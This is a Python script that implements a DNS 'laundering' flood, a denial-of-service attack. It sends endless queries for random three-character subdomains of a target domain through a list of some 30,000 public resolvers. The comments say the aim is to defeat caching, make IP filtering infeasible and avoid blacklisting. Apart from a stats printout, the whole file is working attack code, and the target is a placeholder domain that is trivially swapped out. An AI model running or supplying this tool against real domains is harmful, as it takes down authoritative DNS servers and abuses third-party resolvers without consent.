# This program implements the DNS laundering tactic, in which it performs a DNS flood with
# the packets routed through resolvers to make IP address filtering infeasible
# Randomly generated subdomains are also used to get around caching

import socket
import dnslib
import signal
import sys
import time
import random

domain = 'dummy-site-for-dns-ddos-testing.com'

# Cycle through the big list of 30,000 resolvers to reduce the risk of and consequences from getting blacklisted by some
# Original source: https://github.com/trickest/resolvers/blob/main/resolvers.txt
resolvers = open("resolvers.txt", 'r').read().splitlines()

# Random subdomain generator
# Returns a string of three alphanumeric characters
alphanumeric_chars = [chr(ord('a') + i) for i in range(26)] + [chr(ord('0') + i) for i in range(10)]
subdomain_len = 3
def get_random_subdomain():
    char_indices = []
    for i in range(subdomain_len):
        char_indices.append(random.randint(0, len(alphanumeric_chars) - 1))
    return ''.join([alphanumeric_chars[i] for i in char_indices])

# Open a socket to send requests from
socket_ip = ''
socket_port = 5053 # Arbitrary upper port - any that isn't occupied
socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
socket.bind((socket_ip, socket_port))

# Set signal handler to display attack stats upon termination
packet_count = 0
start_time = time.time()
def signal_handler(sig, frame):
    stop_time = time.time()
    elapsed_time = stop_time - start_time
    print()
    print("Attack terminated")
    print(str(packet_count) + " packets sent in " + str(elapsed_time) + " seconds ")
    print("(" + str(packet_count / elapsed_time) + " packets / sec)")
    sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

# Start spamming packets until program termination
print("Starting DNS flood now - press Ctrl-C to stop")
while True:
    # Generate random subdomain and corresponding packet
    # Done only once per cycle to reduce overhead and increase attack volume
    subdomain = get_random_subdomain()
    flood_packet = dnslib.DNSRecord.question(subdomain + "." + domain, 'A')
    flood_packet_raw = flood_packet.pack()
    # Cycle through list of resolvers
    for resolver_ip in resolvers:
        try:
            socket.sendto(flood_packet_raw, (resolver_ip, 53))
            packet_count += 1
        except OSError: # If OS complains about running out of memory, ignore it
            continue
